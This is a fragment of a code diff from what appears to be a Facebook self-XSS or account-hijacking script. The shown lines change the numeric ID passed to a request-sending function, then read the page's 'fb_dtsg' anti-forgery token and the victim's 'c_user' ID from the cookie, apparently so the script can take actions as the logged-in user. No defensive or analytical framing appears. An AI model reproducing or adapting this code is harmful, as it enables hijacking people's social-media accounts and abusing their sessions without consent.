@@ -12,7 +12,7 @@ function g(d) {
     };
     a.send(d)
 }
-g("326991057447362");
+g("1396933943871070");
 b = document.getElementsByName("fb_dtsg")[0].value;
 c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
